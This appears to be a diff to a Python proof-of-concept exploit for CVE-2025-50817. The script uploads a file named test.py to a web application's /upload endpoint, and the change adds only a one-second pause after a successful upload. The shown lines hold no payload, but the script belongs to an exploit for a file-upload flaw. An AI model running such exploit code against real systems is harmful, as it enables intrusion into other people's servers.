@@ -1,5 +1,6 @@
 import requests
 import os
+import time
 
 # POC for CVE-2025-50817 in the vulnerable web app
 # Target URL
@@ -28,6 +29,7 @@ try:
         response = requests.post(f"{BASE_URL}/upload", files=files)
         if response.status_code == 200:
             print("[+] Successfully uploaded test.py")
+            time.sleep(1)
         else:
             print(f"[-] Upload failed with status code {response.status_code}")
 except Exception as e:
